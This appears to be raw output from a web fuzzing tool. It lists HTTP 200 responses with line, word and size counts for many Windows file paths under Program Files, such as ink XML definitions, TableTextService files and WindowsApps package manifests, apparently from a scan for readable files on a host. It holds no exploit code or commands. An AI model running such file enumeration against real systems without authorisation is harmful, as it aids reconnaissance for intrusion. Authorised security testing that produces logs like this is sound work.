000000438:   200        8 L      43 W       804 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/base_jpn.xml"                      
000000437:   200        23 L     57 W       738 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/base_heb.xml"                      
000000434:   200        979 L    3305 W     44503 Ch    "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main.xml"                               
000000436:   200        46 L     256 W      3529 Ch     "Program Files/Common Files/microsoft shared/ink/fsdefinitions/main/base_ca.xml"                       
000000433:   200        5 L      19 W       390 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/keypad/kor-kor.xml"                     
000000430:   200        18 L     42 W       693 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/keypad.xml"                             
000000432:   200        15 L     60 W       903 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/keypad/keypadbase.xml"                  
000000460:   200        13 L     57 W       790 Ch      "Program Files/Common Files/microsoft shared/ink/fsdefinitions/symbols/ja-jp-sym.xml"                  
000000462:   200        4 L      232 W      2418 Ch     "Program Files/Common Files/microsoft shared/ink/ipsar.xml"                                            
000000466:   200        30 L     257 W      2556 Ch     "Program Files/Common Files/microsoft shared/ink/ipscsy.xml"                                           
000000474:   200        3 L      243 W      2532 Ch     "Program Files/Common Files/microsoft shared/ink/ipshe.xml"                                            
000000480:   200        30 L     291 W      2566 Ch     "Program Files/Common Files/microsoft shared/ink/ipskor.xml"                                           
000000479:   200        30 L     287 W      2522 Ch     "Program Files/Common Files/microsoft shared/ink/ipsjpn.xml"                                           
000000478:   200        29 L     253 W      2526 Ch     "Program Files/Common Files/microsoft shared/ink/ipsita.xml"                                           
000000477:   200        1 L      238 W      2570 Ch     "Program Files/Common Files/microsoft shared/ink/ipsid.xml"                                            
000000476:   200        30 L     289 W      2652 Ch     "Program Files/Common Files/microsoft shared/ink/ipshrv.xml"                                           
000000473:   200        30 L     307 W      2628 Ch     "Program Files/Common Files/microsoft shared/ink/ipsfra.xml"                                           
000000475:   200        3 L      318 W      2518 Ch     "Program Files/Common Files/microsoft shared/ink/ipshi.xml"                                            
000000472:   200        30 L     285 W      2658 Ch     "Program Files/Common Files/microsoft shared/ink/ipsfin.xml"                                           
000000471:   200        34 L     334 W      3024 Ch     "Program Files/Common Files/microsoft shared/ink/ipsesp.xml"                                           
000000469:   200        4 L      241 W      2618 Ch     "Program Files/Common Files/microsoft shared/ink/ipsel.xml"                                            
000000470:   200        30 L     285 W      2578 Ch     "Program Files/Common Files/microsoft shared/ink/ipsen.xml"                                            
000000468:   200        30 L     286 W      2616 Ch     "Program Files/Common Files/microsoft shared/ink/ipsdeu.xml"                                           
000000465:   200        30 L     264 W      2436 Ch     "Program Files/Common Files/microsoft shared/ink/ipscht.xml"                                           
000000467:   200        30 L     255 W      2514 Ch     "Program Files/Common Files/microsoft shared/ink/ipsdan.xml"                                           
000000464:   200        30 L     264 W      2462 Ch     "Program Files/Common Files/microsoft shared/ink/ipschs.xml"                                           
000000461:   200        63 L     333 W      3812 Ch     "Program Files/Common Files/microsoft shared/ink/fsdefinitions/symbols/symbase.xml"                    
000000463:   200        30 L     262 W      2592 Ch     "Program Files/Common Files/microsoft shared/ink/ipscat.xml"                                           
000000481:   200        30 L     285 W      2626 Ch     "Program Files/Common Files/microsoft shared/ink/ipsnld.xml"                                           
000000483:   200        30 L     285 W      2600 Ch     "Program Files/Common Files/microsoft shared/ink/ipsplk.xml"                                           
000000487:   200        30 L     257 W      2542 Ch     "Program Files/Common Files/microsoft shared/ink/ipsrus.xml"                                           
000000424:   200        14715    74326 W    736191 Ch   "Program Files/Common Files/microsoft shared/ink/Alphabet.xml"                                         
                        L                                                                                                                                      
000000492:   200        415 L    2783 W     19626 Ch    "Program Files/Common Files/microsoft shared/ink/ThirdPartyNotices.MSHWLatin.txt"                      
000000491:   200        7 L      254 W      2720 Ch     "Program Files/Common Files/microsoft shared/ink/ipstr.xml"                                            
000000490:   200        30 L     255 W      2520 Ch     "Program Files/Common Files/microsoft shared/ink/ipssve.xml"                                           
000000489:   200        30 L     288 W      2596 Ch     "Program Files/Common Files/microsoft shared/ink/ipssrl.xml"                                           
000000486:   200        30 L     294 W      2644 Ch     "Program Files/Common Files/microsoft shared/ink/ipsrom.xml"                                           
000000488:   200        30 L     261 W      2568 Ch     "Program Files/Common Files/microsoft shared/ink/ipssrb.xml"                                           
000000485:   200        29 L     146 W      2240 Ch     "Program Files/Common Files/microsoft shared/ink/ipsptg.xml"                                           
000000482:   200        30 L     285 W      2580 Ch     "Program Files/Common Files/microsoft shared/ink/ipsnor.xml"                                           
000000484:   200        29 L     147 W      2246 Ch     "Program Files/Common Files/microsoft shared/ink/ipsptb.xml"                                           
000000329:   200        37377    80582 W    1272944 C   "Program Files (x86)/Windows NT/TableTextService/TableTextServiceArray.txt"                            
                        L                   h                                                                                                                  
000002174:   200        150 L    1191 W     24257 Ch    "Program Files/Reference Assemblies/Microsoft/Framework/v3.5/RedistList/FrameworkList.xml"             
000002182:   200        64 L     70 W       2355 Ch     "Program Files/Windows Media Player/Media Renderer/RenderingControl_DMP.xml"                           
000002186:   200        88 L     99 W       2574 Ch     "Program Files/Windows Media Player/Network Sharing/MediaReceiverRegistrar.xml"                        
000002185:   200        221 L    237 W      7515 Ch     "Program Files/Windows Media Player/Network Sharing/ContentDirectory.xml"                              
000002184:   200        150 L    144 W      5422 Ch     "Program Files/Windows Media Player/Network Sharing/ConnectionManager.xml"                             
000002181:   200        132 L    145 W      5428 Ch     "Program Files/Windows Media Player/Media Renderer/connectionmanager_dmr.xml"                          
000002183:   200        164 L    173 W      6363 Ch     "Program Files/Windows Media Player/Media Renderer/RenderingControl.xml"                               
000002180:   200        499 L    532 W      20699 Ch    "Program Files/Windows Media Player/Media Renderer/avtransport.xml"                                    
000002179:   200        16 L     144 W      1091 Ch     "Program Files/Windows Defender/ThirdPartyNotices.txt"                                                 
000002173:   200        17 L     132 W      2578 Ch     "Program Files/Reference Assemblies/Microsoft/Framework/v3.0/WinFXList.xml"                            
000002172:   200        41 L     357 W      7122 Ch     "Program Files/Reference Assemblies/Microsoft/Framework/v3.0/RedistList/FrameworkList.xml"             
000002189:   200        448 L    2324 W     14198 Ch    "Program Files/Windows NT/TableTextService/TableTextServiceTigrinya.txt"                               
000002191:   200        1 L      21 W       591 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.BingWeather_4.25.20211.0_neutral_split.scal
                                                        e-150_8wekyb3d8bbwe/AppxBlockMap.xml"                                                                  
000002195:   200        1 L      73 W       2554 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.GetHelp_10.1706.13331.0_neutral_split.scale
                                                        -125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                                   
000002203:   200        1 L      41 W       1349 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.MicrosoftSolitaireCollection_4.2.11280.0_ne
                                                        utral_split.scale-200_8wekyb3d8bbwe/AppxBlockMap.xml"                                                  
000002219:   200        1 L      89 W       3225 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.SkypeApp_14.35.152.0_neutral_split.scale-12
                                                        5_kzf8qxf38zg5c/AppxBlockMap.xml"                                                                      
000002227:   200        1 L      65 W       2364 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsCalculator_10.1812.10048.0_neutral_s
                                                        plit.scale-125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                         
000002228:   200        1 L      23 W       843 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsCalculator_10.1812.10048.0_neutral_s
                                                        plit.scale-125_8wekyb3d8bbwe/AppxManifest.xml"                                                         
000002226:   200        1 L      23 W       835 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsAlarms_10.1812.10043.0_neutral_split
                                                        .scale-125_8wekyb3d8bbwe/AppxManifest.xml"                                                             
000002225:   200        1 L      161 W      6100 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsAlarms_10.1812.10043.0_neutral_split
                                                        .scale-125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                             
000002224:   200        15 L     40 W       909 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.Windows.Photos_2019.18114.19418.0_neutral_s
                                                        plit.scale-125_8wekyb3d8bbwe/AppxManifest.xml"                                                         
000002223:   200        1 L      85 W       3007 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.Windows.Photos_2019.18114.19418.0_neutral_s
                                                        plit.scale-125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                         
000002222:   200        1 L      23 W       830 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WebMediaExtensions_1.0.13321.0_neutral_spli
                                                        t.scale-125_8wekyb3d8bbwe/AppxManifest.xml"                                                            
000002221:   200        1 L      113 W      4168 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WebMediaExtensions_1.0.13321.0_neutral_spli
                                                        t.scale-125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                            
000002220:   200        15 L     40 W       861 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.SkypeApp_14.35.152.0_neutral_split.scale-12
                                                        5_kzf8qxf38zg5c/AppxManifest.xml"                                                                      
000002218:   200        1 L      23 W       839 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.ScreenSketch_10.1811.3471.0_neutral_split.s
                                                        cale-125_8wekyb3d8bbwe/AppxManifest.xml"                                                               
000002217:   200        1 L      73 W       2794 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.ScreenSketch_10.1811.3471.0_neutral_split.s
                                                        cale-125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                               
000002216:   200        1 L      24 W       816 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.Print3D_3.3.311.0_neutral_split.scale-200_8
                                                        wekyb3d8bbwe/AppxManifest.xml"                                                                         
000002215:   200        1 L      101 W      3942 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.Print3D_3.3.311.0_neutral_split.scale-200_8
                                                        wekyb3d8bbwe/AppxBlockMap.xml"                                                                         
000002214:   200        1 L      24 W       816 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.Print3D_3.3.311.0_neutral_split.scale-125_8
                                                        wekyb3d8bbwe/AppxManifest.xml"                                                                         
000002213:   200        1 L      101 W      3940 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.Print3D_3.3.311.0_neutral_split.scale-125_8
                                                        wekyb3d8bbwe/AppxBlockMap.xml"                                                                         
000002212:   200        1 L      23 W       831 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.People_10.1812.10232.0_neutral_split.scale-
                                                        125_8wekyb3d8bbwe/AppxManifest.xml"                                                                    
000002211:   200        1 L      73 W       2636 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.People_10.1812.10232.0_neutral_split.scale-
                                                        125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                                    
000002210:   200        1 L      23 W       861 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.OneConnect_5.1902.361.0_neutral_split.scale
                                                        -125_8wekyb3d8bbwe/AppxManifest.xml"                                                                   
000002209:   200        1 L      101 W      3703 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.OneConnect_5.1902.361.0_neutral_split.scale
                                                        -125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                                   
000002208:   200        1 L      23 W       855 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.MixedReality.Portal_2000.19010.1151.0_neutr
                                                        al_split.scale-125_8wekyb3d8bbwe/AppxManifest.xml"                                                     
000002207:   200        1 L      65 W       2532 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.MixedReality.Portal_2000.19010.1151.0_neutr
                                                        al_split.scale-125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                     
000002206:   200        1 L      25 W       827 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.MicrosoftStickyNotes_3.1.53.0_neutral_split
                                                        .scale-125_8wekyb3d8bbwe/AppxManifest.xml"                                                             
000002205:   200        1 L      49 W       1578 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.MicrosoftStickyNotes_3.1.53.0_neutral_split
                                                        .scale-125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                             
000002202:   200        1 L      25 W       839 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.MicrosoftSolitaireCollection_4.2.11280.0_ne
                                                        utral_split.scale-125_8wekyb3d8bbwe/AppxManifest.xml"                                                  
000002204:   200        1 L      25 W       839 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.MicrosoftSolitaireCollection_4.2.11280.0_ne
                                                        utral_split.scale-200_8wekyb3d8bbwe/AppxManifest.xml"                                                  
000002201:   200        1 L      41 W       1349 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.MicrosoftSolitaireCollection_4.2.11280.0_ne
                                                        utral_split.scale-125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                  
000002200:   200        1 L      26 W       913 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.MicrosoftOfficeHub_18.1901.1141.0_neutral_s
                                                        plit.scale-125_8wekyb3d8bbwe/AppxManifest.xml"                                                         
000002199:   200        1 L      55 W       1815 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.MicrosoftOfficeHub_18.1901.1141.0_neutral_s
                                                        plit.scale-125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                         
000002198:   200        1 L      23 W       830 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.Getstarted_7.3.20251.0_neutral_split.scale-
                                                        200_8wekyb3d8bbwe/AppxManifest.xml"                                                                    
000002197:   200        1 L      89 W       3230 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.Getstarted_7.3.20251.0_neutral_split.scale-
                                                        200_8wekyb3d8bbwe/AppxBlockMap.xml"                                                                    
000002194:   200        1 L      23 W       843 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.DesktopAppInstaller_1.0.30251.0_neutral_spl
                                                        it.scale-125_8wekyb3d8bbwe/AppxManifest.xml"                                                           
000002196:   200        1 L      23 W       820 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.GetHelp_10.1706.13331.0_neutral_split.scale
                                                        -125_8wekyb3d8bbwe/AppxManifest.xml"                                                                   
000002193:   200        1 L      113 W      4418 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.DesktopAppInstaller_1.0.30251.0_neutral_spl
                                                        it.scale-125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                           
000002190:   200        1769 L   4706 W     45170 Ch    "Program Files/Windows NT/TableTextService/TableTextServiceYi.txt"                                     
000002192:   200        1 L      23 W       849 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.BingWeather_4.25.20211.0_neutral_split.scal
                                                        e-150_8wekyb3d8bbwe/AppxManifest.xml"                                                                  
000002229:   200        1 L      89 W       3534 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsCamera_2018.826.78.0_neutral_split.s
                                                        cale-125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                               
000002187:   200        37377    80582 W    1272944 C   "Program Files/Windows NT/TableTextService/TableTextServiceArray.txt"                                  
                        L                   h                                                                                                                  
000002231:   200        1 L      89 W       3540 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsCamera_2018.826.78.0_neutral_split.s
                                                        cale-200_8wekyb3d8bbwe/AppxBlockMap.xml"                                                               
000002235:   200        1 L      49 W       1862 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsFeedbackHub_1.1811.10571.0_neutral_s
                                                        plit.scale-180_8wekyb3d8bbwe/AppxBlockMap.xml"                                                         
000002242:   200        1 L      23 W       849 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsSoundRecorder_10.1812.10043.0_neutra
                                                        l_split.scale-200_8wekyb3d8bbwe/AppxManifest.xml"                                                      
000002243:   200        1 L      53 W       1994 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsStore_11811.1001.18.0_neutral_split.
                                                        scale-125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                              
000002241:   200        1 L      65 W       2404 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsSoundRecorder_10.1812.10043.0_neutra
                                                        l_split.scale-200_8wekyb3d8bbwe/AppxBlockMap.xml"                                                      
000002240:   200        1 L      23 W       849 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsSoundRecorder_10.1812.10043.0_neutra
                                                        l_split.scale-125_8wekyb3d8bbwe/AppxManifest.xml"                                                      
000002239:   200        1 L      65 W       2402 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsSoundRecorder_10.1812.10043.0_neutra
                                                        l_split.scale-125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                      
000002238:   200        1 L      23 W       839 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsMaps_5.1812.10071.0_neutral_split.sc
                                                        ale-125_8wekyb3d8bbwe/AppxManifest.xml"                                                                
000002237:   200        1 L      621 W      27078 Ch    "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsMaps_5.1812.10071.0_neutral_split.sc
                                                        ale-125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                                
000002234:   200        1 L      23 W       843 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsFeedbackHub_1.1811.10571.0_neutral_s
                                                        plit.scale-140_8wekyb3d8bbwe/AppxManifest.xml"                                                         
000002236:   200        1 L      23 W       843 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsFeedbackHub_1.1811.10571.0_neutral_s
                                                        plit.scale-180_8wekyb3d8bbwe/AppxManifest.xml"                                                         
000002233:   200        1 L      49 W       1862 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsFeedbackHub_1.1811.10571.0_neutral_s
                                                        plit.scale-140_8wekyb3d8bbwe/AppxBlockMap.xml"                                                         
000002230:   200        15 L     40 W       923 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsCamera_2018.826.78.0_neutral_split.s
                                                        cale-125_8wekyb3d8bbwe/AppxManifest.xml"                                                               
000002232:   200        15 L     40 W       923 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsCamera_2018.826.78.0_neutral_split.s
                                                        cale-200_8wekyb3d8bbwe/AppxManifest.xml"                                                               
000002244:   200        1 L      26 W       941 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.WindowsStore_11811.1001.18.0_neutral_split.
                                                        scale-125_8wekyb3d8bbwe/AppxManifest.xml"                                                              
000002246:   200        1 L      23 W       812 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.XboxApp_48.48.7001.0_neutral_split.scale-12
                                                        5_8wekyb3d8bbwe/AppxManifest.xml"                                                                      
000002250:   200        1 L      23 W       833 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.XboxGamingOverlay_2.26.14003.0_neutral_spli
                                                        t.scale-125_8wekyb3d8bbwe/AppxManifest.xml"                                                            
000002256:   200        1 L      23 W       847 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.ZuneVideo_10.18111.17311.0_neutral_split.sc
                                                        ale-125_8wekyb3d8bbwe/AppxManifest.xml"                                                                
000002255:   200        1 L      73 W       2768 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.ZuneVideo_10.18111.17311.0_neutral_split.sc
                                                        ale-125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                                
000002254:   200        1 L      23 W       844 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.ZuneMusic_10.18111.17311.0_neutral_split.sc
                                                        ale-125_8wekyb3d8bbwe/AppxManifest.xml"                                                                
000002253:   200        1 L      85 W       3241 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.ZuneMusic_10.18111.17311.0_neutral_split.sc
                                                        ale-125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                                
000002252:   200        1 L      23 W       825 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.YourPhone_0.0.13313.0_neutral_split.scale-1
                                                        25_8wekyb3d8bbwe/AppxManifest.xml"                                                                     
000002249:   200        1 L      45 W       1451 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.XboxGamingOverlay_2.26.14003.0_neutral_spli
                                                        t.scale-125_8wekyb3d8bbwe/AppxBlockMap.xml"                                                            
000002251:   200        1 L      113 W      4394 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.YourPhone_0.0.13313.0_neutral_split.scale-1
                                                        25_8wekyb3d8bbwe/AppxBlockMap.xml"                                                                     
000002248:   200        1 L      23 W       812 Ch      "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.XboxApp_48.48.7001.0_neutral_split.scale-20
                                                        0_8wekyb3d8bbwe/AppxManifest.xml"                                                                      
000002245:   200        1 L      113 W      4208 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.XboxApp_48.48.7001.0_neutral_split.scale-12
                                                        5_8wekyb3d8bbwe/AppxBlockMap.xml"                                                                      
000002247:   200        1 L      113 W      4214 Ch     "Program Files/WindowsApps/DeletedAllUserPackages/Microsoft.XboxApp_48.48.7001.0_neutral_split.scale-20
                                                        0_8wekyb3d8bbwe/AppxBlockMap.xml"                                                                      
000002188:   200        28077    61811 W    980224 Ch   "Program Files/Windows NT/TableTextService/TableTextServiceDaYi.txt"                                   
                        L                                                                                                                                      
000002402:   200        1 L      207 W      7360 Ch     "Program Files/WindowsApps/microsoft.net.native.framework.1.7_1.7.27413.0_x86__8wekyb3d8bbwe/AppxBlockM
                                                        ap.xml"                                                                                                
000002401:   200        17 L     55 W       1160 Ch     "Program Files/WindowsApps/microsoft.net.native.framework.1.7_1.7.27413.0_x64__8wekyb3d8bbwe/AppxManife
                                                        st.xml"                                                                                                
000002400:   200        1 L      247 W      8817 Ch     "Program Files/WindowsApps/microsoft.net.native.framework.1.7_1.7.27413.0_x64__8wekyb3d8bbwe/AppxBlockM
                                                        ap.xml"                                                                                                
000002403:   200        17 L     55 W       1160 Ch     "Program Files/WindowsApps/microsoft.net.native.framework.1.7_1.7.27413.0_x86__8wekyb3d8bbwe/AppxManife
                                                        st.xml"                                                                                                
000002409:   200        27 L     55 W       1175 Ch     "Program Files/WindowsApps/microsoft.net.native.runtime.1.7_1.7.27422.0_x64__8wekyb3d8bbwe/AppxManifest
                                                        .xml"                                                                                                  
000002415:   200        17 L     55 W       1154 Ch     "Program Files/WindowsApps/microsoft.net.native.runtime.2.2_2.2.28604.0_x86__8wekyb3d8bbwe/AppxManifest
                                                        .xml"                                                                                                  
000002414:   200        1 L      36 W       1061 Ch     "Program Files/WindowsApps/microsoft.net.native.runtime.2.2_2.2.28604.0_x86__8wekyb3d8bbwe/AppxBlockMap
                                                        .xml"                                                                                                  
000002413:   200        17 L     55 W       1154 Ch     "Program Files/WindowsApps/microsoft.net.native.runtime.2.2_2.2.28604.0_x64__8wekyb3d8bbwe/AppxManifest
                                                        .xml"                                                                                                  
000002412:   200        1 L      38 W       1135 Ch     "Program Files/WindowsApps/microsoft.net.native.runtime.2.2_2.2.28604.0_x64__8wekyb3d8bbwe/AppxBlockMap
                                                        .xml"                                                                                                  
000002411:   200        27 L     55 W       1175 Ch     "Program Files/WindowsApps/microsoft.net.native.runtime.1.7_1.7.27422.0_x86__8wekyb3d8bbwe/AppxManifest
                                                        .xml"                                                                                                  
000002408:   200        1 L      36 W       1070 Ch     "Program Files/WindowsApps/microsoft.net.native.runtime.1.7_1.7.27422.0_x64__8wekyb3d8bbwe/AppxBlockMap
                                                        .xml"                                                                                                  
000002410:   200        1 L      34 W       996 Ch      "Program Files/WindowsApps/microsoft.net.native.runtime.1.7_1.7.27422.0_x86__8wekyb3d8bbwe/AppxBlockMap
                                                        .xml"                                                                                                  
000002465:   200        29 L     36 W       1275 Ch     "Program Files/WindowsApps/microsoft.print3d_3.3.791.0_x64__8wekyb3d8bbwe/SendDocument.xml"            
000002464:   200        14 L     20 W       718 Ch      "Program Files/WindowsApps/microsoft.print3d_3.3.791.0_x64__8wekyb3d8bbwe/JobStatusQuery.xml"          
000002463:   200        16 L     18 W       697 Ch      "Program Files/WindowsApps/microsoft.print3d_3.3.791.0_x64__8wekyb3d8bbwe/GetPrinterElements.xml"      
000002462:   200        27 L     30 W       1196 Ch     "Program Files/WindowsApps/microsoft.print3d_3.3.791.0_x64__8wekyb3d8bbwe/GetPrintDeviceCapabilities.xm
                                                        l"                                                                                                     
000002461:   200        11 L     16 W       547 Ch      "Program Files/WindowsApps/microsoft.print3d_3.3.791.0_x64__8wekyb3d8bbwe/GetActiveJobs.xml"           
000002458:   200        11 L     156 W      975 Ch      "Program Files/WindowsApps/microsoft.print3d_3.3.791.0_x64__8wekyb3d8bbwe/Common/ReadMe.txt"           
000002459:   200        2157 L   6888 W     50033 Ch    "Program Files/WindowsApps/microsoft.print3d_3.3.791.0_x64__8wekyb3d8bbwe/GCode.txt"                   
000002460:   200        18 L     24 W       820 Ch      "Program Files/WindowsApps/microsoft.print3d_3.3.791.0_x64__8wekyb3d8bbwe/Get.xml"                     
000002457:   200        18 L     24 W       827 Ch      "Program Files/WindowsApps/microsoft.print3d_3.3.791.0_x64__8wekyb3d8bbwe/CancelJob.xml"               
000002456:   200        106 L    176 W      4292 Ch     "Program Files/WindowsApps/microsoft.print3d_3.3.791.0_x64__8wekyb3d8bbwe/Assets/Resources/RequiredPrin
                                                        tCapabilities.xml"                                                                                     
000002455:   200        64 L     182 W      4177 Ch     "Program Files/WindowsApps/microsoft.print3d_3.3.791.0_x64__8wekyb3d8bbwe/AppxManifest.xml"            
000002454:   200        1 L      1023 W     37863 Ch    "Program Files/WindowsApps/microsoft.print3d_3.3.791.0_x64__8wekyb3d8bbwe/AppxBlockMap.xml"            
000002453:   200        559 L    1264 W     27606 Ch    "Program Files/WindowsApps/microsoft.print3d_3.3.791.0_neutral_~_8wekyb3d8bbwe/AppxMetadata/AppxBundleM
                                                        anifest.xml"                                                                                           
000002452:   200        1 L      12 W       340 Ch      "Program Files/WindowsApps/microsoft.print3d_3.3.791.0_neutral_~_8wekyb3d8bbwe/AppxBlockMap.xml"       
000002466:   200        28 L     35 W       1457 Ch     "Program Files/WindowsApps/microsoft.print3d_3.3.791.0_x64__8wekyb3d8bbwe/SendPrintJob.xml"            
000002468:   200        1 L      23 W       837 Ch      "Program Files/WindowsApps/microsoft.screensketch_10.2008.2277.0_neutral_split.scale-100_8wekyb3d8bbwe/
                                                        AppxManifest.xml"                                                                                      
000002472:   200        553 L    1252 W     28296 Ch    "Program Files/WindowsApps/microsoft.screensketch_2020.814.2355.0_neutral_~_8wekyb3d8bbwe/AppxMetadata/
                                                        AppxBundleManifest.xml"                                                                                
000002486:   200        1 L      317 W      11290 Ch    "Program Files/WindowsApps/microsoft.ui.xaml.2.1_2.11906.6001.0_x64__8wekyb3d8bbwe/AppxBlockMap.xml"   
000002485:   200        153 L    590 W      16711 Ch    "Program Files/WindowsApps/microsoft.ui.xaml.2.0_2.1810.18004.0_x86__8wekyb3d8bbwe/AppxManifest.xml"   
000002484:   200        1 L      159 W      5538 Ch     "Program Files/WindowsApps/microsoft.ui.xaml.2.0_2.1810.18004.0_x86__8wekyb3d8bbwe/AppxBlockMap.xml"   
000002483:   200        153 L    590 W      16711 Ch    "Program Files/WindowsApps/microsoft.ui.xaml.2.0_2.1810.18004.0_x64__8wekyb3d8bbwe/AppxManifest.xml"   
000002482:   200        1 L      197 W      6924 Ch     "Program Files/WindowsApps/microsoft.ui.xaml.2.0_2.1810.18004.0_x64__8wekyb3d8bbwe/AppxBlockMap.xml"   
000002471:   200        1 L      12 W       340 Ch      "Program Files/WindowsApps/microsoft.screensketch_2020.814.2355.0_neutral_~_8wekyb3d8bbwe/AppxBlockMap.
                                                        xml"                                                                                                   
000002470:   200        145 L    260 W      8422 Ch     "Program Files/WindowsApps/microsoft.screensketch_10.2008.2277.0_x64__8wekyb3d8bbwe/AppxManifest.xml"  
000002467:   200        1 L      105 W      3877 Ch     "Program Files/WindowsApps/microsoft.screensketch_10.2008.2277.0_neutral_split.scale-100_8wekyb3d8bbwe/
                                                        AppxBlockMap.xml"                                                                                      
000002469:   200        1 L      828 W      33150 Ch    "Program Files/WindowsApps/microsoft.screensketch_10.2008.2277.0_x64__8wekyb3d8bbwe/AppxBlockMap.xml"  
000002487:   200        114 L    434 W      11959 Ch    "Program Files/WindowsApps/microsoft.ui.xaml.2.1_2.11906.6001.0_x64__8wekyb3d8bbwe/AppxManifest.xml"   
000002489:   200        114 L    434 W      11959 Ch    "Program Files/WindowsApps/microsoft.ui.xaml.2.1_2.11906.6001.0_x86__8wekyb3d8bbwe/AppxManifest.xml"   
000002493:   200        132 L    506 W      14257 Ch    "Program Files/WindowsApps/microsoft.ui.xaml.2.3_2.32002.13001.0_x86__8wekyb3d8bbwe/AppxManifest.xml"  
000002510:   200        24 L     62 W       1113 Ch     "Program Files/WindowsApps/microsoft.wallet_2.4.18324.0_neutral_~_8wekyb3d8bbwe/AppxMetadata/AppxBundle
                                                        Manifest.xml"                                                                                          
